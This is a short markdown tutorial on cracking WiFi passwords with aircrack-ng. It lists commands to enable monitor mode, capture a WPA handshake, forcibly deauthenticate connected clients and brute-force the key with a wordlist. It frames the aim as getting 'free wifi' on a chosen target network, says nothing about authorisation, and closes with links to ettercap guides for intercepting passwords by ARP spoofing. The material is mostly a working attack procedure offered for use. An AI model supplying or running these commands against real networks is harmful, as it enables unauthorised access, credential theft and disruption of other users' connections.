## How to crack WiFi passwords

### Prerequisites
- It is better to use bare-metal Ubuntu or Kali
- You need a wireless network adapter which supports monitor mode
- `sudo apt install aircrack-ng --fix-missing`

### Steps
1. Open root shell.

2. To kill the services running, do  
   `airmon-ng check kill`

3. Get the interface name via  
   `airmon-ng`

4. Start monitor mode by doing  
   `airmon-ng start [interface name]`

5. To get the new interface name, do  
   `iwconfig`

6. Look for the WiFi you want to hack and copy channel number (CH) and ID (BSSID)  
   `airodump-ng [interface name]`

7. Now we will need to record the packets, so run  
   `airodump-ng -c[CH] -w [file to write packet dump to] -d [BSSID] [interface name]`  
   Eg. `airodump-ng -c9 -w tobehacked -d 1C:61:B4:9B:96:C0 wlo1mon`  

   Take note that you will be able to see the other devices currently on the network under `STATION`  

8.  Now that packet capture has started, you need to deauth someone so that they reconnect or get someone else who has the password to connect. In another terminal, run
   `aireplay-ng --deauth [count] -a [BSSID] -c [STATIONID] [interface name]`
   Note that if you do not specify the client to deauth, then it will be a broadcast deauth.

9.  Now, pray that someone was deauthed and their EAPOL authentication packet was captured.

10. Stop the capture: `ctrl+c`  
    Do `ls` and look for `[file to write packet dump to]-01.cap`. Eg. `tobehacked-01.cap`

11. Now, we need to crack the authentication packet. Run  
    `aircrack-ng [capture file] -w [wordlist]`  
    Eg. `aircrack-ng tobehacked-01.cap -w rockyou.txt`

12. If it says that no EAPOL packet was found, then you have no choice but to restart the packet capture with another filename and try the deauth attack again.

13. Otherwise, you got your password. Now you got to turn back on your own WiFi lol...  
    `airmon-ng stop [interface name]`  
    Eg. `airmon-ng stop wlo1mon`  

    Then run  
    `systemctl start wpa_supplicant NetworkManager`

14. Connect to the WiFi and hopefully free wifi yay!

### Extension

To carry out more hacking (with ettercap), refer to:
- https://www.comparitech.com/net-admin/ettercap-cheat-sheet/
- https://null-byte.wonderhowto.com/how-to/use-ettercap-intercept-passwords-with-arp-spoofing-0191191/